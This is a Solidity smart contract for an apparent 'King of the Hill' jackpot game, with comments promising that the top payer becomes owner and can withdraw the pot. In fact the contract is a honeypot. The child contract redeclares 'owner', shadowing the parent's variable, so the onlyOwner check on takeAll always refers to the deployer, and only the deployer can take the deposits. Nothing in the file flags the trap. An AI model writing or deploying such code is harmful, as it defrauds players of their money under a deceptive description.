1 pragma solidity ^0.4.11;
2 
3 // Simple Game. Each time you send more than the current jackpot, you become
4 // owner of the contract. As an owner, you can take the jackpot after a delay
5 // of 5 days after the last payment.
6 
7 contract Owned {
8     address owner;    function Owned() {
9         owner = msg.sender;
10     }
11     modifier onlyOwner{
12         if (msg.sender != owner)
13             revert();        _;
14     }
15 }
16 
17 contract KingOfTheHill is Owned {
18     address public owner;
19     uint public jackpot;
20     uint public withdrawDelay;
21 
22     function() public payable {
23         // transfer contract ownership if player pay more than current jackpot
24         if (msg.value > jackpot) {
25             owner = msg.sender;
26             withdrawDelay = block.timestamp + 5 days;
27         }
28         jackpot+=msg.value;
29     }
30 
31     function takeAll() public onlyOwner {
32         require(block.timestamp >= withdrawDelay);
33         msg.sender.transfer(this.balance);
34         jackpot=0;
35     }
36 }